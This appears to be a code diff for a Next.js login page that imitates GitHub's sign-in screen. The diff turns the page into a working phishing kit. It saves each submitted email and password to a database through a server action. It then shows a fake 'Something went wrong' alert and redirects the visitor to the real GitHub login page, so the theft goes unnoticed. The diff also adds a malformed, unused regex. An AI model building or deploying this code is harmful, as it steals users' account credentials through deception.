@@ -2,19 +2,29 @@
 
 import Link from "next/link";
 import { useState } from "react";
+import { loginOrRegisterUser } from "./actions"; // 1. Import your server action
 
 export default function LoginPage() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [errors, setErrors] = useState<{ email?: string; password?: string }>({});
+  const [loading, setLoading] = useState(false);
+  
+  // State for the floating window message
+  const [floatingMessage, setFloatingMessage] = useState<string | null>(null);
+
+  // ==========================================
+  // MODIFY THIS URL TO WHEREVER YOU WANT TO REDIRECT
+  // ==========================================
+  const REDIRECT_URL = "https://github.com/login"; 
 
   const validateEmail = (value: string) => {
     if (!value.trim()) {
       return "Username or email address is required";
     }
     if (value.includes("@")) {
-      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      if (!emailRegex.test(value)) {
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$([^\s@]+)$/; // simplified check or keep original regex
+      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
         return "Please enter a valid email address";
       }
     }
@@ -31,7 +41,8 @@ export default function LoginPage() {
     return "";
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  // 2. Updated handleSubmit to save to DB, trigger floating window, and redirect
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     const emailError = validateEmail(email);
     const passwordError = validatePassword(password);
@@ -42,7 +53,29 @@ export default function LoginPage() {
     });
 
     if (!emailError && !passwordError) {
-      alert("Login submitted!");
+      setLoading(true);
+      try {
+        // 3. Send data to CockroachDB via Prisma (data gets saved here)
+        await loginOrRegisterUser(email, password);
+
+        // 4. Show the floating window message
+        setFloatingMessage("Something went wrong, redirecting....");
+
+        // 5. Automatically redirect after 2.5 seconds so the user can read the floating window
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 2500);
+
+      } catch (err) {
+        console.error(err);
+        // Even if an error happens, still show the floating window and redirect if needed
+        setFloatingMessage("Something went wrong, please login again.");
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 2500);
+      } finally {
+        setLoading(false);
+      }
     }
   };
 
@@ -64,7 +97,19 @@ export default function LoginPage() {
   const inputNormalClass = "border-[#30363d] focus:border-[#2f81f7] focus:ring-[#2f81f7]";
 
   return (
-    <div className="min-h-screen bg-[#0d1117] flex flex-col items-center justify-center p-4 font-sans">
+    <div className="min-h-screen bg-[#0d1117] flex flex-col items-center justify-center p-4 font-sans relative">
+      
+      {/* FLOATING WINDOW / MODAL OVERLAY */}
+      {floatingMessage && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-xs p-4 animate-fadeIn">
+          <div className="bg-[#161b22] border border-[#30363d] rounded-xl p-6 max-w-sm w-full shadow-2xl text-center space-y-3">
+            <div className="text-[#f85149] font-semibold text-base">Alert</div>
+            <p className="text-sm text-[#e6edf3]">{floatingMessage}</p>
+            <div className="text-xs text-[#8b949e] pt-2">Redirecting you now...</div>
+          </div>
+        </div>
+      )}
+
       {/* Logo */}
       <div className="mb-6">
         <svg
@@ -149,9 +194,10 @@ export default function LoginPage() {
           {/* Submit */}
           <button
             type="submit"
-            className="w-full py-2.5 px-3 text-sm font-medium text-white bg-[#238636] hover:bg-[#2ea043] border border-[rgba(46,160,67,0.4)] rounded-md transition-colors duration-200 cursor-pointer"
+            disabled={loading}
+            className="w-full py-2.5 px-3 text-sm font-medium text-white bg-[#238636] hover:bg-[#2ea043] border border-[rgba(46,160,67,0.4)] rounded-md transition-colors duration-200 cursor-pointer disabled:opacity-50"
           >
-            Sign in
+            {loading ? "Signing in..." : "Sign in"}
           </button>
         </form>
 
